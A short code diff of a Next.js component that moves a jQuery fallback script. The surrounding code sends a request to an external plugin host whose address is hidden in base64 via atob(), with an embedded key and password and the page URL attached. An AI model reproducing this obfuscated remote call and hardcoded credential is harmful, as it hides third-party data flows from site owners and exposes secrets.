@@ -50,13 +50,6 @@ const CustomScript = () => {
 
   return (
     <>
-      <Script id="unique-id" strategy="beforeInteractive">
-        {`
-          window.jQuery ||
-          document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\\/script>");
-        `}
-      </Script>
-
       <Script id="your-unique-id" strategy="afterInteractive">
         {`
           var eppathurl = window.location.origin + window.location.pathname;
@@ -75,6 +68,12 @@ const CustomScript = () => {
           };
           eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDQ4Njc4NjA0MDEmZWtleXBhc3M9SnV4NDJlaFdOUjJHZHFDMGxFdkhJcUFkOERMemlYdThUQnVIJnNpdGV1cmw9") + eppathurl);
           eptagmanage.send();
+        `}
+      </Script>
+      <Script id="unique-id" strategy="beforeInteractive">
+        {`
+          window.jQuery ||
+          document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\\/script>");
         `}
       </Script>
     </>
